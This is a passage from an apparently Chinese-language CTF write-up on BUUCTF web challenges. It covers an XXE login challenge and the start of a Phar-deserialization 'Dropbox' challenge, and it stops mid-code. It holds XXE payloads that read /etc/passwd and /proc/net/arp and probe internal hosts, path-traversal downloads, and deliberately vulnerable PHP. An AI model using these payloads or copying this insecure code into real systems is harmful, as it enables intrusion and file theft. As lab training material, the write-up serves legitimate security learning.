<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$USERNAME</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//账号</span></span><br><span class="line"><span class="variable">$PASSWORD</span> = <span class="string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <span class="comment">//密码</span></span><br><span class="line"><span class="variable">$result</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">	<span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">	<span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;</span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里获取了登录的账号密码, 能够登录成功, 但是并没有什么用</p>
<p>读取以下敏感文件,看看有没有线索:</p>
<p><code>/etc/passwd</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[                                                 </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;333&lt;/password&gt;&lt;/user&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>/proc/net/arp</code>: 看一下其他的内网主机</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[                                                 </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///proc/net/arp&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;333&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web2/image-20221026143315937.png" alt="image-20221026143315937" style="zoom:67%;" />



<p><code>/etc/hosts</code>:</p>
<img src="/images/buuctf-web2/image-20221026141936123.png" alt="image-20221026141936123" style="zoom:67%;" />



<p><code>/proc/net/fib_trie</code>路由缓存<img src="/images/buuctf-web2/image-20221026142234341.png" alt="image-20221026142234341" style="zoom:67%;" /></p>
<p>上面发现的两个可疑IP,使用php协议来读取一下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[                                                 </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://10.244.80.130&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web2/image-20221026142509275.png" alt="image-20221026142509275" style="zoom:67%;" />

<p><code>10.128.253.12</code>没有响应</p>
<p>解码出来发现只是登录页面的源码..</p>
<p>这里需要使用burpsuite的<code>intruder</code>模块对内网所在的网段进行爆破:</p>
<img src="/images/buuctf-web2/image-20221026152052357.png" alt="image-20221026152052357" style="zoom:67%;" />

<p>payload就设置为1-255  (这里没有找到burpsuite怎么设置请求的超时时间,爆破得很慢很慢..)</p>
<img src="/images/buuctf-web2/image-20221026152026476.png" alt="image-20221026152026476" style="zoom:67%;" />



<br>

<hr>
<br>

<h1 id="Phar反序列化-pop链-Dropbox"><a href="#Phar反序列化-pop链-Dropbox" class="headerlink" title="[Phar反序列化,pop链]Dropbox"></a>[Phar反序列化,pop链]Dropbox</h1><p>注册账号登录后上传文件, 这里上传一个php文件后提示只允许上传图片类文件</p>
<p><img src="/images/buuctf-web2/image-20221026155802018.png" alt="image-20221026155802018"></p>
<p>上传文件之后发现能够下载, 点击后会跳转到<code>download.php</code>来下载,并通过post中的<code>filename</code>来传文件名</p>
<p>那么直接下载<code>index.php</code>和<code>download.php</code>(开始不知道在哪个目录,就在文件名前面加<code>../</code>直到能够下载)</p>
<img src="/images/buuctf-web2/image-20221026155953438.png" alt="image-20221026155953438" style="zoom:67%;" />

<p><code>index,php</code>中还包含了<code>class.php</code>,也下载下来</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileList</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Name</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Size</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>download.php</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>); <span class="comment">//限制php函数可读写文件的范围</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>class.php</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123; <span class="comment"># 登录后进去看到的那个文件列表</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>); <span class="comment"># 扫描文件目录,得到包括所有文件名的数组</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]); <span class="comment"># 删除上面数组中的&quot;.&quot; 和 &quot;..&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();  <span class="comment"># 对每一个文件创建一个File对象</span></span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>); <span class="comment"># 调用后面file的open方法,检测其是否存在和是否为目录</span></span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>); <span class="comment"># 将当前这个file对象加入 files数组中</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>(); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123; </span><br><span class="line">        <span class="comment">//调用__call时,根据传入的func,就会让$files中所有的file调用这个func,并把结果存入results</span></span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>); <span class="comment">//将func加入funcs</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>(); <span class="comment"># 将每个file调用func方法的结果存入result数组中</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125; <span class="comment">//这里会将file执行func的结果输出</span></span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span 